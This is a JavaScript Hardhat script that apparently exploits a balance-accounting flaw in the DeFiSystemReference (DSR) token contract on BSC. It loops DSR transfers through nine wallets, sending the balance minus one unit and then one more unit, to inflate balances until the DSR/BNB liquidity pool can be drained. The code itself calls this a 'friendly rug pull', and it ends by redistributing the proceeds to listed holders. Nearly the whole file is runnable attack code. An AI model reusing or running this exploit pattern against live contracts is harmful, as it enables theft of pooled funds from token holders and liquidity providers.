const fs = require('fs');
const { ethers, network, artifacts } = require('hardhat');
const path = require("path");
const jsonFile = fs.readFileSync(path.resolve(__dirname, "../../dsrHolders01.json")).toString().trim();
const networkData = JSON.parse(fs.readFileSync(path.resolve(__dirname, "../networks/bsc.json")));
const jsonParsed = JSON.parse(jsonFile);
const FACTOR = 10**18;
const MIN_FACTOR = 10**8;
const GAS_LIMIT = 12500000;
const TIME_TO_WAIT = 100;
const PROFIT = "0.1";

const main = async () => {
    var tx;
    var holders = [];
    var totalAmount = 0;
    for (i = 0; i < jsonParsed.length; i++) {
        var balance = jsonParsed[i].Balance * FACTOR;
        var holder = [jsonParsed[i].HolderAddress, balance.toLocaleString('fullwide', {useGrouping:false}), balance];
        holders.push(holder);
        totalAmount += jsonParsed[i].Balance;
    }

    const [deployer] = await ethers.getSigners();
    const wallets = await ethers.getSigners();
    const signer = ethers.provider.getSigner(deployer.address);

    var previousBalance = await deployer.getBalance();

    // Performing friendly rug pull here
    const DSR = await artifacts.readArtifact("DeFiSystemReference");
    const IUniswapV2Factory = await artifacts.readArtifact("IUniswapV2Factory");
    const dsr = new ethers.Contract(networkData.Contracts.DeFiSystemReference, DSR.abi, ethers.provider);
    const factory = new ethers.Contract(networkData.Contracts.Factory, IUniswapV2Factory.abi, ethers.provider);
    const dsrEthPairAddress = await factory.getPair(networkData.Contracts.DeFiSystemReference, networkData.Contracts.Assets[0]);

    const initialAmount = await dsr.balanceOf(dsrEthPairAddress);
    const amountToRug = initialAmount * 100;
    var earnedAmount = 0;
    var index = 1;
    var numberOfWallets = 9;
    const initialBalance = await dsr.availableBalanceOf(deployer.address);

    console.log(`DSR Friendly Rug Pull`);
    console.log(`----------------------------------------------------------------------------------`);
    console.log(`We need to earn aprox. ${(amountToRug / FACTOR).toFixed(2)} to rug the DSR/{BNB|MATIC|FTM} LP fully.`);
    console.log(`We have an initial balance of ${(initialBalance / FACTOR).toFixed(2)} DSR in order to perform the rug.`);
    console.log(`----------------------------------------------------------------------------------`);

    console.log(`Resuming token contract...`);
    await dsr.connect(signer).setRsdTokenAddress(networkData.Contracts.ReferenceSystemDeFi);
    await new Promise(resolve => setTimeout(resolve, TIME_TO_WAIT));
    await dsr.connect(signer).unpauseInvestments();
    await new Promise(resolve => setTimeout(resolve, TIME_TO_WAIT));

    // console.log(`Transferring ${((initialBalance - 1) / MIN_FACTOR).toFixed(0).toLocaleString('fullwide', {useGrouping:false})} DSR`);
    tx = await dsr.connect(signer).transfer(wallets[index].address, ((initialBalance - 1) / MIN_FACTOR).toFixed(0).toLocaleString('fullwide', {useGrouping:false}));
    await new Promise(resolve => setTimeout(resolve, TIME_TO_WAIT));
    console.log(`Starting by transferring ${((initialBalance - 1) / FACTOR).toFixed(2)} DSR from ${signer._address} to ${wallets[index].address}. Hash: ${tx.hash}`);

    await dsr.connect(signer).receiveProfit(false, {value: ethers.utils.parseEther(PROFIT)});
    await new Promise(resolve => setTimeout(resolve, TIME_TO_WAIT));

    await dsr.connect(signer).transfer(wallets[index].address, 1);
    console.log(`Transferring a little fraction of DSR from ${signer._address} to ${wallets[index].address}. Hash: ${tx.hash}`);
    await new Promise(resolve => setTimeout(resolve, TIME_TO_WAIT));
    var newBalance = await dsr.balanceOf(wallets[index].address);
    console.log(`New Balance [${wallets[index].address}]: ${(newBalance / FACTOR).toFixed(2)}`);
    console.log(`----------------------------------------------------------------------------------`);
    console.log(`Exploiting...`);

    while (earnedAmount < amountToRug) {
        if (index > numberOfWallets)
            index = 1;
        var currentSigner = ethers.provider.getSigner(wallets[index].address);
        earnedAmount = await dsr.availableBalanceOf(wallets[index].address);
        var nextAddress = (index == numberOfWallets) ? wallets[1].address : wallets[++index].address;
        tx = await dsr.connect(currentSigner).transfer(nextAddress, ((earnedAmount - 1) / MIN_FACTOR).toFixed(0).toLocaleString('fullwide', {useGrouping:false}));
        var lastHash = tx.hash;
        await new Promise(resolve => setTimeout(resolve, TIME_TO_WAIT));

        tx = await dsr.connect(currentSigner).transfer(nextAddress, 1);
        await new Promise(resolve => setTimeout(resolve, TIME_TO_WAIT));
        earnedAmount = await dsr.availableBalanceOf(nextAddress);

        console.log(`Step #${index}`);
        console.log(`Earned ${(earnedAmount / FACTOR).toFixed(2)} DSR`);
        console.log(`From ${currentSigner._address} to ${nextAddress}. Hashes: ${lastHash} | ${tx.hash}`);
        console.log(`-------`);
    }

    var currentBalance = await deployer.getBalance();
    var amountToReimburse = currentBalance - previousBalance;

    console.log(`----------------------------------------------------------------------------------`);
    console.log(`REIMBURSING`);
    console.log(`Total Amount       : ${totalAmount}`);
    console.log(`Previous Balance   : ${(previousBalance / FACTOR).toFixed(8)}`);
    console.log(`Current Balance    : ${(currentBalance / FACTOR).toFixed(8)}`);
    console.log(`Amount to Reimburse: ${(amountToReimburse / FACTOR).toFixed(8)}`);
    console.log(`----------------------------------------------------------------------------------`);

    for (i = 0; i < jsonParsed.length; i++) {
        var amount = amountToReimburse * (jsonParsed[i].Balance / totalAmount);
        var holder = [jsonParsed[i].HolderAddress, amount.toLocaleString('fullwide', {useGrouping:false}), amount];
        var tx = await deployer.sendTransaction({to: holder[0], value: ethers.utils.parseEther((holder[2] / FACTOR).toFixed(8).toString()), gasLimit: GAS_LIMIT});
        await new Promise(resolve => setTimeout(resolve, TIME_TO_WAIT));
        console.log(`Reimbursing ${(holder[2] / FACTOR).toFixed(8)} ETH to ${holder[0]}. Transaction Hash: ${tx.hash}`);
    }
}

main()
	.then(() => process.exit(0))
	.catch(error => {
		console.error(error);
		process.exit(1);
	});